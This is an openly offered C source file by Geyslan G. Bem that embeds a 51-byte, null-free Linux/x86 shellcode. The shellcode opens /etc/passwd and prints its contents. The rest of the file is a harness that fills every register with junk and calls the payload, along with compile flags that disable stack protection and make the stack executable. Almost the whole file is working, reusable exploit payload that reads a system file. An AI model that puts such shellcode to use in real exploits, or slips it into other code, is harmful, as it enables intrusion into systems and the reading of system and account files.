/*

   Tiny Read File Shellcode - C Language - Linux/x86
   Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <http://www.gnu.org/licenses/>.

*/

/*

   tiny_read_file_shellcode

   * 51 bytes
   * null-free
   * read 4096 bytes from /etc/passwd file


   # gcc -m32 -fno-stack-protector -z execstack tiny_read_file_shellcode.c -o tiny_read_file_shellcode

   Testing
   # ./tiny_read_file_shellcode

*/


#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \

              "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73"
              "\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f"
              "\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03"
              "\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92"
              "\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd"
              "\x80";


main ()
{

    // When contains null bytes, printf will show a wrong shellcode length.

    printf("Shellcode Length:  %d\n", strlen(shellcode));

    // Pollutes all registers ensuring that the shellcode runs in any circumstance.

    __asm__ ("movl $0xffffffff, %eax\n\t"
            "movl %eax, %ebx\n\t"
            "movl %eax, %ecx\n\t"
            "movl %eax, %edx\n\t"
            "movl %eax, %esi\n\t"
            "movl %eax, %edi\n\t"
            "movl %eax, %ebp\n\t"

            // Calling the shellcode
            "call shellcode");

}